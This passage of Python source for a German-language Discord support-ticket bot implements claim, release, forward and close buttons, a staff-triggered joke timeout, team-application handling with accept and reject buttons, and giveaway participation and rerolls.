            extra=f"**Claim**\n> Übernommen von {member.mention} um **{stamp}**",
        )

        await reply_v2(
            interaction,
            InfoLayout(
                title="✅ Ticket geclaimt",
                body=(
                    f"**{member.mention}** hat übernommen.\n\n"
                    f"{build_status_bar(STATUS_CLAIMED)}\n\n"
                    f"> 🎫 Seit **{stamp}**\n"
                    f"> Andere Staff: vorerst **kein** Schreibzugriff\n"
                    f"> **Freigeben** gibt das Ticket wieder frei"
                ),
                accent=discord.Color.green(),
            ),
        )

        await audit_log(
            guild,
            title="✋ Audit · Ticket geclaimt",
            body=(
                f"> **Ticket:** {channel.mention} (`{channel.name}`)\n"
                f"> **Staff:** {member.mention} (`{member.id}`)\n"
                f"> **Status:** {build_status_bar(STATUS_CLAIMED)}"
            ),
            accent=discord.Color.green(),
        )


class UnclaimButton(ui.Button):
    def __init__(self):
        super().__init__(
            label="Freigeben",
            style=discord.ButtonStyle.secondary,
            custom_id="ticket_unclaim",
            emoji="🔓",
        )

    async def callback(self, interaction: discord.Interaction):
        if await _deny_if_cooldown(interaction, "unclaim", action="Freigeben"):
            return
        if not await require_ticket_channel(interaction, action="Freigeben"):
            return

        member = await require_staff(interaction, action="Freigeben")
        if member is None:
            return
        guild = interaction.guild
        assert guild is not None
        channel = interaction.channel
        assert isinstance(channel, discord.TextChannel)

        meta = _ticket_meta.get(channel.id, {})
        claimer_id = meta.get("claimer_id") or _ticket_claimers.get(channel.id)
        if not claimer_id:
            await deny_v2(
                interaction,
                action="Freigeben",
                reason="Das Ticket ist **nicht geclaimt** — es gibt nichts freizugeben.",
                fix="Jemand muss zuerst **Claimen**, bevor Freigeben Sinn ergibt.",
                details=f"> {build_status_bar(str(meta.get('status') or STATUS_OPEN))}",
                accent=discord.Color.orange(),
                title="🔓 Nicht geclaimt",
            )
            return

        is_admin = member.guild_permissions.administrator
        if int(claimer_id) != member.id and not is_admin:
            await deny_v2(
                interaction,
                action="Freigeben",
                reason="Nur der **aktuelle Claimer** oder ein **Admin** darf freigeben.",
                fix="Bitte den Claimer, freizugeben — oder nutze **Weiterleiten**.",
                details=(
                    f"> **Claimer:** <@{claimer_id}>\n"
                    f"> **Geclaimt seit:** **{claim_age_text(meta)}**\n"
                    f"> **Du:** {member.mention}"
                ),
                title="🔒 Nicht dein Claim",
            )
            return

        age = claim_age_text(meta)
        old_claimer = guild.get_member(int(claimer_id))

        clear_claimer(channel.id)
        await apply_staff_can_write(channel, guild)
        if old_claimer is not None:
            # individuelle Override entfernen → Staff-Rolle gilt wieder
            try:
                await channel.set_permissions(old_claimer, overwrite=None)
            except discord.HTTPException:
                pass

        await refresh_control_message(
            channel,
            extra=(
                f"**Freigegeben**\n"
                f"> Von {member.mention} (war geclaimt **{age}**)\n"
                f"> Ticket ist wieder **offen** für alle Staff"
            ),
        )

        if not interaction.response.is_done():
            try:
                await interaction.response.defer()
            except discord.HTTPException:
                pass

        await reply_v2(
            interaction,
            InfoLayout(
                title="🔓 Ticket freigegeben",
                body=(
                    f"{build_status_bar(STATUS_OPEN)}\n\n"
                    f"> Vorheriger Claimer: <@{claimer_id}>\n"
                    f"> Claim-Dauer: **{age}**\n"
                    f"> Freigegeben von: {member.mention}"
                ),
                accent=discord.Color.blurple(),
            ),
        )

        await audit_log(
            guild,
            title="🔓 Audit · Claim freigegeben",
            body=(
                f"> **Ticket:** {channel.mention}\n"
                f"> **Alt:** <@{claimer_id}>\n"
                f"> **Durch:** {member.mention}\n"
                f"> **Dauer war:** {age}\n"
                f"> **Status:** {build_status_bar(STATUS_OPEN)}"
            ),
            accent=discord.Color.blurple(),
        )


class CloseButton(ui.Button):
    def __init__(self):
        super().__init__(
            label="Schließen",
            style=discord.ButtonStyle.red,
            custom_id="ticket_close",
            emoji="🔒",
        )

    async def callback(self, interaction: discord.Interaction):
        if await _deny_if_cooldown(interaction, "close", action="Schließen"):
            return
        if not await require_ticket_channel(interaction, action="Schließen"):
            return

        member = _member(interaction)
        guild = interaction.guild
        assert guild is not None
        channel = interaction.channel
        assert isinstance(channel, discord.TextChannel)

        if channel.id in _closing_channels or str((_ticket_meta.get(channel.id) or {}).get("status")) == STATUS_CLOSING:
            await deny_v2(
                interaction,
                action="Schließen",
                reason="Die Schließung läuft **bereits**.",
                fix="Einfach warten — der Kanal verschwindet gleich.",
                details=f"> {build_status_bar(STATUS_CLOSING)}",
                accent=discord.Color.orange(),
            )
            return

        if member and is_staff(member, guild):
            await close_ticket_flow(
                interaction=interaction,
                delay=CLOSE_DELAY_STAFF,
                title="Ticket wird geschlossen",
                body=(
                    f"> **Von:** {member.mention}\n"
                    f"> **Zeit:** {now_str()}"
                ),
            )
            return

        # User: nur eigene Tickets
        owner_id = resolve_owner_id(channel)
        if owner_id and interaction.user.id != owner_id and not (member and is_staff(member, guild)):
            await deny_v2(
                interaction,
                action="Schließen",
                reason="Nur der **Ticket-Ersteller** oder **Staff** kann schließen.",
                fix="Bitte Staff um Schließung bitten.",
                details=f"> **Ersteller:** <@{owner_id}>",
            )
            return

        await reply_v2(interaction, CloseRequestLayout(requester=interaction.user))


class ForwardButton(ui.Button):
    def __init__(self):
        super().__init__(
            label="Weiter",
            style=discord.ButtonStyle.blurple,
            custom_id="ticket_forward",
            emoji="🔄",
        )

    async def callback(self, interaction: discord.Interaction):
        if await _deny_if_cooldown(interaction, "forward", action="Weiterleiten"):
            return
        if not await require_ticket_channel(interaction, action="Weiterleiten"):
            return

        member = await require_staff(interaction, action="Weiterleiten")
        if member is None:
            return

        meta = _ticket_meta.get(interaction.channel.id, {})  # type: ignore[union-attr]
        if str(meta.get("status")) == STATUS_CLOSING:
            await deny_v2(
                interaction,
                action="Weiterleiten",
                reason="Ticket wird geschlossen — Weiterleiten nicht mehr möglich.",
                fix="Zu spät für eine Übergabe.",
                accent=discord.Color.orange(),
            )
            return

        await reply_v2(interaction, ForwardLayout(current_supporter=member), ephemeral=True)


class TrollButton(ui.Button):
    def __init__(self):
        super().__init__(
            label="Spaß",
            style=discord.ButtonStyle.danger,
            custom_id="ticket_troll",
            emoji="🤡",
        )

    async def callback(self, interaction: discord.Interaction):
        if await _deny_if_cooldown(interaction, "troll", action="Spaß-Ticket"):
            return
        if not await require_ticket_channel(interaction, action="Spaß-Ticket"):
            return

        member = await require_staff(interaction, action="Spaß-Ticket")
        if member is None:
            return
        guild = interaction.guild
        channel = interaction.channel
        assert guild is not None and isinstance(channel, discord.TextChannel)

        if channel.id in _closing_channels:
            await deny_v2(
                interaction,
                action="Spaß-Ticket",
                reason="Ticket wird bereits geschlossen.",
                fix="Warte ab.",
                accent=discord.Color.orange(),
            )
            return

        me = guild.me
        if me is None or not me.guild_permissions.moderate_members:
            await deny_v2(
                interaction,
                action="Spaß-Ticket",
                reason="Dem Bot fehlt die Berechtigung **Mitglieder timeouten**.",
                fix="Admin: Bot-Rolle höher setzen + Recht „Mitglieder timeouten“ geben.",
                details="> Ohne dieses Recht schlägt der Timeout später fehl.",
                accent=discord.Color.orange(),
                title="⚠️ Bot-Rechte fehlen",
            )
            # trotzdem fortfahren? besser abbrechen
            return

        owner_id = resolve_owner_id(channel)
        if not owner_id:
            await deny_v2(
                interaction,
                action="Spaß-Ticket",
                reason="Ticket-Ersteller konnte **nicht** ermittelt werden.",
                fix="Topic/Owner-Daten fehlen — Ticket manuell schließen.",
            )
            return

        if member.id == int(owner_id):
            await deny_v2(
                interaction,
                action="Spaß-Ticket",
                reason="Du kannst Spaß-Modus **nicht auf dein eigenes Ticket** anwenden.",
                fix="Nur bei Tickets von anderen Usern nutzbar.",
                title="🚫 Eigenes Ticket",
            )
            return

        owner = guild.get_member(owner_id)
        if owner is not None:
            if owner.id == guild.owner_id:
                await deny_v2(
                    interaction,
                    action="Spaß-Ticket",
                    reason="Der Server-Owner kann **nicht** getimeoutet werden.",
                    fix="Anderes Ticket / normale Schließung nutzen.",
                )
                return
            if owner.top_role >= me.top_role and guild.owner_id != me.id:
                await deny_v2(
                    interaction,
                    action="Spaß-Ticket",
                    reason="Die Rolle des Users ist **gleich/höher** als die Bot-Rolle.",
                    fix="Bot-Rolle über die User-Rolle schieben.",
                    details=f"> Ziel: {owner.mention} · Top-Rolle: **{owner.top_role.name}**",
                    accent=discord.Color.orange(),
                )
                return
            await safe_set_perms(
                channel,
                owner,
                view_channel=False,
                send_messages=False,
                read_message_history=False,
            )

        await audit_log(
            guild,
            title="🤡 Audit · Spaß-Ticket gestartet",
            body=(
                f"> **Ticket:** {channel.mention}\n"
                f"> **Staff:** {member.mention}\n"
                f"> **Ziel:** <@{owner_id}>\n"
                f"> Ersteller aus Kanal entfernt — Timeout-Menü offen"
            ),
            accent=discord.Color.dark_red(),
        )

        await reply_v2(interaction, TrollLayout())


class ConfirmCloseButton(ui.Button):
    def __init__(self):
        super().__init__(
            label="Bestätigen",
            style=discord.ButtonStyle.danger,
            custom_id="ticket_confirm_close",
            emoji="✅",
        )

    async def callback(self, interaction: discord.Interaction):
        if await _deny_if_cooldown(interaction, "confirm_close", action="Schließung bestätigen"):
            return
        if not await require_ticket_channel(interaction, action="Schließung bestätigen"):
            return
        member = await require_staff(interaction, action="Schließung bestätigen")
        if member is None:
            return
        await close_ticket_flow(
            interaction=interaction,
            delay=CLOSE_DELAY_CONFIRM,
            title="Schließung bestätigt",
            body=f"> **Bestätigt von:** {member.mention}\n> **Zeit:** {now_str()}",
        )


class TrollTimeoutSelect(ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="1 Minute", value="60", emoji="⏱️"),
            discord.SelectOption(label="5 Minuten", value="300", emoji="⏱️"),
            discord.SelectOption(label="10 Minuten", value="600", emoji="⏱️"),
            discord.SelectOption(label="1 Stunde", value="3600", emoji="⏳"),
            discord.SelectOption(label="12 Stunden", value="43200", emoji="⏳"),
            discord.SelectOption(label="1 Tag", value="86400", emoji="🛑"),
            discord.SelectOption(label="3 Tage", value="259200", emoji="🛑"),
            discord.SelectOption(label="1 Woche", value="604800", emoji="🚫"),
            discord.SelectOption(label="3 Wochen", value="1814400", emoji="💀"),
        ]
        super().__init__(
            placeholder="Timeout-Dauer…",
            min_values=1,
            max_values=1,
            options=options,
            custom_id="troll_timeout_select",
        )

    async def callback(self, interaction: discord.Interaction):
        if await _deny_if_cooldown(interaction, "troll_timeout", action="Timeout wählen"):
            return
        if not await require_ticket_channel(interaction, action="Timeout wählen"):
            return
        member = await require_staff(interaction, action="Timeout wählen")
        if member is None:
            return
        guild = interaction.guild
        assert guild is not None

        seconds = max(60, min(int(self.values[0]), 28 * 24 * 3600))
        owner_id = resolve_owner_id(interaction.channel)  # type: ignore[arg-type]
        if not owner_id:
            await deny_v2(
                interaction,
                action="Timeout",
                reason="Ticket-Ersteller ist **unbekannt**.",
                fix="Ticket manuell schließen.",
            )
            return

        owner = guild.get_member(owner_id)
        if owner is None:
            try:
                owner = await guild.fetch_member(owner_id)
            except discord.HTTPException:
                owner = None

        label_map = {o.value: o.label for o in self.options}
        readable = label_map.get(str(seconds), f"{seconds}s")
        duration = datetime.timedelta(seconds=seconds)

        if owner is None:
            timeout_msg = "> User nicht mehr auf dem Server."
        else:
            try:
                await owner.timeout(
                    duration,
                    reason=f"Spaß-Ticket von {interaction.user} ({interaction.user.id})",
                )
                timeout_msg = f"> **{owner.mention}** → Timeout **{readable}**"
            except discord.Forbidden:
                timeout_msg = f"> ⚠️ Timeout für **{owner.mention}** fehlgeschlagen (Rechte)."
            except discord.HTTPException as e:
                timeout_msg = f"> ⚠️ Timeout-Fehler: `{e}`"

        await audit_log(
            guild,
            title="⏱️ Audit · Timeout (Spaß-Ticket)",
            body=(
                f"> **Ticket:** {interaction.channel.mention}\n"
                f"> **Ziel:** <@{owner_id}>\n"
                f"> **Dauer:** {readable}\n"
                f"> **Von:** {interaction.user.mention}\n"
                f"{timeout_msg}"
            ),
            accent=discord.Color.dark_red(),
        )

        await close_ticket_flow(
            interaction=interaction,
            delay=3,
            title="🤡 Spaß-Ticket ausgeführt",
            body=f"{timeout_msg}\n> **Von:** {interaction.user.mention}",
            is_troll=True,
        )


class ForwardUserSelect(ui.UserSelect):
    def __init__(self, current_supporter: discord.Member):
        super().__init__(placeholder="Neuen Staff wählen…", min_values=1, max_values=1)
        self._current_supporter = current_supporter

    async def callback(self, interaction: discord.Interaction):
        if await _deny_if_cooldown(interaction, "forward_select", action="Weiterleiten"):
            return
        if not await require_ticket_channel(interaction, action="Weiterleiten"):
            return
        actor = await require_staff(interaction, action="Weiterleiten")
        if actor is None:
            return

        target = self.values[0]
        current = self._current_supporter
        guild = interaction.guild
        assert guild is not None
        channel = interaction.channel
        assert isinstance(channel, discord.TextChannel)

        # Falls der gespeicherte Claimer nicht mehr passt: aktiven Actor nutzen
        meta_now = _ticket_meta.get(channel.id, {})
        real_claimer = meta_now.get("claimer_id") or _ticket_claimers.get(channel.id)
        if real_claimer and int(real_claimer) != current.id:
            m = guild.get_member(int(real_claimer))
            if m is not None:
                current = m

        if not isinstance(target, discord.Member):
            m = guild.get_member(target.id)
            if m is None:
                await deny_v2(
                    interaction,
                    action="Weiterleiten",
                    reason="Die gewählte Person ist **nicht auf diesem Server**.",
                    fix="Wähle ein Teammitglied, das online/im Server ist.",
                )
                return
            target = m

        if target.bot:
            await deny_v2(
                interaction,
                action="Weiterleiten",
                reason="An einen **Bot** kann man keine Tickets übergeben.",
                fix="Wähle einen echten Supporter.",
            )
            return

        if not is_staff(target, guild):
            roles = await get_staff_roles(guild)
            await deny_v2(
                interaction,
                action="Weiterleiten",
                reason=f"{target.mention} hat **keine Staff-Rolle**.",
                fix="Nur Personen mit Staff-Rolle auswählen (`/staff`).",
                details=f"> **Erlaubt:** {staff_role_mentions(roles)}",
            )
            return

        owner_id = resolve_owner_id(channel)
        if owner_id and target.id == int(owner_id):
            await deny_v2(
                interaction,
                action="Weiterleiten",
                reason="Das Ticket kann **nicht an den Ersteller** weitergeleitet werden.",
                fix="Wähle ein anderes Staff-Mitglied.",
                details=f"> **Ersteller:** <@{owner_id}>",
            )
            return

        if target.id == actor.id:
            await deny_v2(
                interaction,
                action="Weiterleiten",
                reason="Du bist bereits in diesem Vorgang — wähle jemand **anderen**.",
                fix="Anderes Staff-Mitglied auswählen.",
                accent=discord.Color.orange(),
                title="ℹ️ Ungültige Auswahl",
            )
            return

        if target.id == current.id:
            await deny_v2(
                interaction,
                action="Weiterleiten",
                reason="Du bist **bereits** der zuständige Supporter.",
                fix="Wähle eine andere Person.",
                accent=discord.Color.orange(),
                title="ℹ️ Bereits du",
            )
            return

        old_meta = dict(_ticket_meta.get(channel.id, {}))
        old_age = claim_age_text(old_meta)

        await apply_staff_view_only(channel, guild)
        # Alten Claimer: nur noch lesen (nicht komplett overwrite löschen)
        await safe_set_perms(
            channel,
            current,
            view_channel=True,
            send_messages=False,
            attach_files=False,
            read_message_history=True,
        )
        await safe_set_perms(
            channel,
            target,
            view_channel=True,
            send_messages=True,
            attach_files=True,
            read_message_history=True,
        )
        set_claimer(channel.id, target.id)

        await refresh_control_message(
            channel,
            extra=(
                f"**Weitergeleitet**\n"
                f"> Von {current.mention} → {target.mention}\n"
                f"> Vorheriger Claim: **{old_age}**"
            ),
        )

        await reply_v2(
            interaction,
            InfoLayout(
                title="🔄 Ticket übergeben",
                body=(
                    f"{build_status_bar(STATUS_CLAIMED)}\n\n"
                    f"> **Von:** {current.mention}\n"
                    f"> **An:** {target.mention}\n"
                    f"> **Zeit:** {now_str()}"
                ),
                accent=discord.Color.blurple(),
            ),
        )

        await audit_log(
            guild,
            title="🔄 Audit · Ticket weitergeleitet",
            body=(
                f"> **Ticket:** {channel.mention}\n"
                f"> **Von:** {current.mention}\n"
                f"> **An:** {target.mention}\n"
                f"> **Alter Claim:** {old_age}\n"
                f"> **Status:** {build_status_bar(STATUS_CLAIMED)}"
            ),
            accent=discord.Color.blurple(),
        )


# =========================================================
#  TICKET ERSTELLEN
# =========================================================

# =========================================================
#  BEWERBUNGS-TICKET SYSTEM (aus NEW.txt)
# =========================================================

class ApplicationModal(ui.Modal, title="Team-Bewerbung ausfüllen"):
    age = ui.TextInput(label="Wie alt bist du?", placeholder="z. B. 18", required=True, max_length=3)
    role_wished = ui.TextInput(
        label="Als was möchtest du dich bewerben?",
        placeholder="z. B. Supporter, Moderator, Developer",
        required=True,
        max_length=50,
    )
    experience = ui.TextInput(
        label="Hast du bereits Vorerfahrungen?",
        style=discord.TextStyle.paragraph,
        placeholder="Beschreibe kurz deine bisherigen Erfahrungen...",
        required=True,
        max_length=500,
    )
    motivation = ui.TextInput(
        label="Warum sollten wir genau dich nehmen?",
        style=discord.TextStyle.paragraph,
        placeholder="Deine Motivation & Stärken...",
        required=True,
        max_length=800,
    )

    async def on_submit(self, interaction: discord.Interaction):
        guild = interaction.guild
        user = interaction.user
        if guild is None:
            await deny_v2(
                interaction,
                action="Bewerbung",
                reason="Nur auf einem Server möglich.",
                fix="Bewerbung über das Panel im Server starten.",
            )
            return

        if is_blacklisted(user, guild):
            await deny_v2(
                interaction,
                action="Bewerbung",
                reason="Du bist für Tickets/Bewerbungen **gesperrt** (Blacklist).",
                fix="Melde dich bei einem Admin.",
                title="🚫 Gesperrt",
            )
            return

        open_t = user_open_tickets(user.id, guild)
        if open_t:
            mentions = ", ".join(ch.mention for ch in open_t[:5])
            await deny_v2(
                interaction,
                action="Bewerbung",
                reason="Du hast bereits ein offenes Ticket/Bewerbung.",
                fix="Zuerst das alte Ticket schließen.",
                details=f"> {mentions}",
                accent=discord.Color.orange(),
            )
            return

        try:
            if not interaction.response.is_done():
                await interaction.response.defer(ephemeral=True)
        except discord.HTTPException:
            pass

        try:
            category = await get_or_create_category(guild)
            staff_roles = await get_staff_roles(guild)
        except discord.HTTPException as e:
            await deny_v2(
                interaction,
                action="Bewerbung",
                reason="Kategorie/Staff konnten nicht geladen werden.",
                fix="Bot-Rechte prüfen.",
                details=f"> `{e}`",
            )
            return

        channel_name = safe_channel_name("bewerbung", user.name)
        overwrites: dict = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),
            user: discord.PermissionOverwrite(
                view_channel=True, send_messages=True, attach_files=True, read_message_history=True
            ),
            guild.me: discord.PermissionOverwrite(
                view_channel=True,
                send_messages=True,
                manage_channels=True,
                manage_permissions=True,
                read_message_history=True,
            ),
        }
        overwrites.update(staff_overwrites(staff_roles, send_messages=True))

        try:
            channel = await with_retry(
                lambda: guild.create_text_channel(
                    name=channel_name,
                    category=category,
                    overwrites=overwrites,
                    topic=f"owner:{user.id} cat:bewerbung",
                    reason=f"Bewerbungs-Ticket von {user}",
                ),
                label="create_app_channel",
            )
        except discord.HTTPException as e:
            await deny_v2(
                interaction,
                action="Bewerbung",
                reason="Kanal konnte nicht erstellt werden.",
                fix="Bot-Recht **Kanäle verwalten** prüfen.",
                details=f"> `{e}`",
            )
            return

        register_ticket(channel.id, user.id, category="bewerbung", guild_id=guild.id)
        mark_create(user.id)

        fence = chr(96) * 3
        age_v = str(self.age.value).strip()
        role_v = str(self.role_wished.value).strip()
        exp_v = str(self.experience.value).strip().replace(fence, "'''")
        mot_v = str(self.motivation.value).strip().replace(fence, "'''")

        meta = _ticket_meta.get(channel.id, {"status": STATUS_OPEN, "category": "bewerbung"})
        control = await channel_v2(
            channel,
            ApplicationTicketLayout(
                applicant=user,
                age=age_v,
                role=role_v,
                experience=exp_v,
                motivation=mot_v,
                meta=meta,
            ),
        )
        if control:
            set_control_message(channel.id, control.id)

        if staff_roles:
            await channel_v2(
                channel,
                InfoLayout(
                    title="🔔 Neue Bewerbung",
                    body=(
                        f"Bewerbung von {user.mention}.\n\n"
                        f"> {staff_role_mentions(staff_roles)}\n\n"
                        f"{build_status_bar(STATUS_OPEN)}"
                    ),
                    accent=discord.Color.gold(),
                ),
                allowed_mentions=discord.AllowedMentions(roles=True, users=False, everyone=False),
            )

        await reply_v2(
            interaction,
            InfoLayout(
                title="✅ Bewerbung eingereicht",
                body=f"> Deine Bewerbung: {channel.mention}\n> Das Team prüft sie in Kürze.",
                accent=discord.Color.green(),
                footer=now_str(),
            ),
            ephemeral=True,
        )

        await audit_log(
            guild,
            title="📝 Audit · Bewerbung erstellt",
            body=(
                f"> **Kanal:** {channel.mention}\n"
                f"> **Bewerber:** {user.mention} (`{user.id}`)\n"
                f"> **Wunschrolle:** {role_v}\n"
                f"> **Alter:** {age_v}"
            ),
            accent=discord.Color.gold(),
        )


class AcceptAppButton(ui.Button):
    def __init__(self):
        super().__init__(
            label="Annehmen",
            style=discord.ButtonStyle.success,
            custom_id="app_accept",
            emoji="✅",
        )

    async def callback(self, interaction: discord.Interaction):
        if await _deny_if_cooldown(interaction, "app_accept", action="Bewerbung annehmen"):
            return
        if not await require_ticket_channel(interaction, action="Bewerbung annehmen"):
            return
        member = await require_staff(interaction, action="Bewerbung annehmen")
        if member is None:
            return
        guild = interaction.guild
        channel = interaction.channel
        assert guild is not None and isinstance(channel, discord.TextChannel)

        owner_id = resolve_owner_id(channel)
        # Bewerber darf eigene Bewerbung NIEMALS selbst annehmen/ablehnen
        if owner_id and member.id == int(owner_id):
            await deny_v2(
                interaction,
                action="Bewerbung annehmen",
                reason="Du kannst deine **eigene** Bewerbung nicht selbst annehmen.",
                fix="Ein **anderes** Staff-Mitglied muss entscheiden.",
                details=f"> Bewerber: <@{owner_id}>",
                title="🚫 Selbst-Entscheidung gesperrt",
            )
            return
        if owner_id and not member.guild_permissions.administrator:
            # optional: nur Staff das nicht Bewerber ist - already handled
            pass
        if owner_id:
            try:
                applicant = await bot.fetch_user(owner_id)
                await applicant.send(
                    view=InfoLayout(
                        title="🎉 Bewerbung angenommen",
                        body=(
                            f"Herzlichen Glückwunsch! Deine Bewerbung auf **{guild.name}** wurde von "
                            f"{member.mention} **angenommen**.\n"
                            "Das Team meldet sich in Kürze bei dir."
                        ),
                        accent=discord.Color.green(),
                        footer=now_str(),
                    )
                )
            except discord.HTTPException:
                pass

        await audit_log(
            guild,
            title="✅ Audit · Bewerbung angenommen",
            body=(
                f"> **Ticket:** {channel.mention}\n"
                f"> **Bewerber:** {f'<@{owner_id}>' if owner_id else '*?*'}\n"
                f"> **Von:** {member.mention}"
            ),
            accent=discord.Color.green(),
        )

        await close_ticket_flow(
            interaction=interaction,
            delay=CLOSE_DELAY_CONFIRM,
            title="Bewerbung angenommen",
            body=f"Die Bewerbung wurde von {member.mention} **angenommen**.",
            skip_rating=True,
        )


class RejectAppButton(ui.Button):
    def __init__(self):
        super().__init__(
            label="Ablehnen",
            style=discord.ButtonStyle.danger,
            custom_id="app_reject",
            emoji="✖️",
        )

    async def callback(self, interaction: discord.Interaction):
        if await _deny_if_cooldown(interaction, "app_reject", action="Bewerbung ablehnen"):
            return
        if not await require_ticket_channel(interaction, action="Bewerbung ablehnen"):
            return
        member = await require_staff(interaction, action="Bewerbung ablehnen")
        if member is None:
            return
        guild = interaction.guild
        channel = interaction.channel
        assert guild is not None and isinstance(channel, discord.TextChannel)

        owner_id = resolve_owner_id(channel)
        if owner_id and member.id == int(owner_id):
            await deny_v2(
                interaction,
                action="Bewerbung ablehnen",
                reason="Du kannst deine **eigene** Bewerbung nicht selbst ablehnen.",
                fix="Ein **anderes** Staff-Mitglied muss entscheiden.",
                details=f"> Bewerber: <@{owner_id}>",
                title="🚫 Selbst-Entscheidung gesperrt",
            )
            return
        try:
            bl_role = await get_or_create_blacklist_role(guild)
        except discord.HTTPException as e:
            await deny_v2(
                interaction,
                action="Bewerbung ablehnen",
                reason="Blacklist-Rolle konnte nicht erstellt werden.",
                fix="Bot-Recht **Rollen verwalten** geben.",
                details=f"> `{e}`",
            )
            return

        if owner_id:
            if owner_id not in _blacklisted_users:
                toggle_blacklist(owner_id)

            applicant_member = guild.get_member(owner_id)
            if applicant_member is not None:
                try:
                    await applicant_member.add_roles(
                        bl_role,
                        reason=f"Bewerbung abgelehnt von {member} -> Blacklist",
                    )
                except (discord.Forbidden, discord.HTTPException):
                    pass

            try:
                applicant = await bot.fetch_user(owner_id)
                await applicant.send(
                    view=InfoLayout(
                        title="Bewerbung abgelehnt",
                        body=(
                            f"Deine Bewerbung auf **{guild.name}** wurde leider **abgelehnt**.\n"
                            "Du wurdest für das Bewerbungs-/Ticket-System gesperrt."
                        ),
                        accent=discord.Color.red(),
                        footer=now_str(),
                    )
                )
            except discord.HTTPException:
                pass

        await audit_log(
            guild,
            title="✖️ Audit · Bewerbung abgelehnt + Blacklist",
            body=(
                f"> **Ticket:** {channel.mention}\n"
                f"> **Bewerber:** {f'<@{owner_id}>' if owner_id else '*?*'}\n"
                f"> **Von:** {member.mention}\n"
                f"> **Rolle:** {bl_role.mention}"
            ),
            accent=discord.Color.red(),
        )

        await close_ticket_flow(
            interaction=interaction,
            delay=CLOSE_DELAY_CONFIRM,
            title="Bewerbung abgelehnt",
            body=(
                f"Abgelehnt von {member.mention}.\n"
                f"> Bewerber erhält {bl_role.mention} und ist blacklisted."
            ),
            skip_rating=True,
        )


class ApplicationTicketLayout(ui.LayoutView):
    """Bewerbungs-Ticket: Formular + Annehmen/Ablehnen + alle Ticket-Buttons."""

    def __init__(
        self,
        *,
        applicant: discord.abc.User,
        age: str,
        role: str,
        experience: str,
        motivation: str,
        meta: dict | None = None,
    ):
        super().__init__(timeout=None)
        meta = meta or {"status": STATUS_OPEN, "category": "bewerbung"}
        status = str(meta.get("status") or STATUS_OPEN)
        bar = build_status_bar(status)
        app_name = getattr(applicant, "display_name", None) or getattr(applicant, "name", None) or "Bewerber"
        app_id = getattr(applicant, "id", 0)
        app_mention = getattr(applicant, "mention", None) or f"<@{app_id}>"
        container = ui.Container(accent_color=discord.Color.gold())
        container.add_item(
            ui.TextDisplay(
                f"## 📝 Neue Bewerbung: {app_name}\n\n"
                f"### Status\n{bar}\n\n"
                f"> **Bewerber:** {app_mention} (`{app_id}`)\n"
                f"> **Alter:** {age}\n"
                f"> **Wunschrolle:** {role}\n\n"
                f"**Vorerfahrungen**\n```\n{experience[:900]}\n```\n"
                f"**Motivation**\n```\n{motivation[:900]}\n```\n\n"
                f"**Wichtig**\n"
                f"> Nur **anderes Staff** darf annehmen/ablehnen — nicht der Bewerber selbst.\n\n"
                f"-# {BRAND_FOOTER}"
            )
        )
        container.add_item(ui.Separator())
        app_row = ui.ActionRow()
        app_row.add_item(AcceptAppButton())
        app_row.add_item(RejectAppButton())
        container.add_item(app_row)
        claimed = status in (STATUS_CLAIMED, STATUS_WAITING) and bool(meta.get("claimer_id"))
        container.add_item(make_ticket_button_row(claim_disabled=claimed))
        self.add_item(container)


# =========================================================
#  GIVEAWAY SYSTEM (aus NEW.txt)
# =========================================================

class GiveawayJoinButton(ui.Button):
    def __init__(self, gw_id: str, joined: bool):
        super().__init__(
            label="Teilnahme zurückziehen" if joined else "Teilnehmen",
            style=discord.ButtonStyle.secondary if joined else discord.ButtonStyle.success,
            emoji="🎉",
            custom_id=f"gw_join_{gw_id}",
        )
        self.gw_id = gw_id

    async def callback(self, interaction: discord.Interaction):
        if await _deny_if_cooldown(interaction, f"gw_join_{self.gw_id}", action="Giveaway"):
            return
        gw = _giveaways.get(self.gw_id)
        if not gw:
            await deny_v2(
                interaction,
                action="Giveaway",
                reason="Dieses Giveaway existiert **nicht mehr**.",
                fix="Anderes Giveaway im Panel wählen.",
            )
            return
        if gw["ended"]:
            await deny_v2(
                interaction,
                action="Giveaway",
                reason="Dieses Giveaway ist bereits **beendet**.",
                fix="Gewinner siehst du in der Beendet-Ansicht / Reroll (Staff).",
                accent=discord.Color.orange(),
            )
            return

        user_id = interaction.user.id
        if user_id in gw["participants"]:
            gw["participants"].discard(user_id)
            status_text = "Du hast deine Teilnahme **zurückgezogen**."
            joined = False
        else:
            gw["participants"].add(user_id)
            status_text = "Du nimmst jetzt am Giveaway **teil**! Viel Glück!"
            joined = True
        schedule_save()

        await interaction.response.edit_message(
            view=GiveawayTicketLayout(self.gw_id, interaction.user)
        )
        await interaction.followup.send(
            view=InfoLayout(
                title="🎉 Giveaway-Status",
                body=f"> {status_text}\n> Teilnehmer gesamt: **{len(gw['participants'])}**",
                accent=discord.Color.gold(),
                footer=now_str(),
            ),
            ephemeral=True,
        )


class GiveawayRerollButton(ui.Button):
    def __init__(self, gw_id: str):
        super().__init__(
            label="Gewinner Rerollen",
            style=discord.ButtonStyle.secondary,
            emoji="🎲",
            custom_id=f"gw_reroll_{gw_id}",
        )
        self.gw_id = gw_id

    async def callback(self, interaction: discord.Interaction):
        if await _deny_if_cooldown(interaction, f"gw_reroll_{self.gw_id}", action="Reroll"):
            return
        member = await require_staff(interaction, action="Reroll")
        if member is None:
            return
        gw = _giveaways.get(self.gw_id)
        if not gw or not gw["participants"]:
            await deny_v2(
                interaction,
                action="Reroll",
                reason="Keine Teilnehmer für ein Reroll vorhanden.",
                fix="Giveaway muss Teilnehmer gehabt haben.",
            )
            return

        count = min(int(gw["winners"]), len(gw["participants"]))
        new_winners = random.sample(list(gw["participants"]), count)
        new_winner_text = ", ".join(f"<@{uid}>" for uid in new_winners)
        gw["winner_text"] = new_winner_text
        gw["ended"] = True
        schedule_save()

        await interaction.response.edit_message(
            view=GiveawayTicketLayout(self.gw_id, interaction.user)
        )
        await interaction.followup.send(
            view=InfoLayout(
                title="🎲 Reroll erfolgreich",
                body=f"**Neue Gewinner:**\n> {new_winner_text}",
                accent=discord.Color.gold(),
                footer=now_str(),
            )
        )
        await audit_log(
            interaction.guild,
            title="🎲 Audit · Giveaway Reroll",
            body=(
                f"> **Preis:** {gw['prize']}\n"
                f"> **Neu:** {new_winner_text}\n"
                f"> **Von:** {member.mention}"
            ),
            accent=discord.Color.gold(),
        )


class GiveawayTicketLayout(ui.LayoutView):
    def __init__(self, gw_id: str, user: discord.abc.User | None = None):
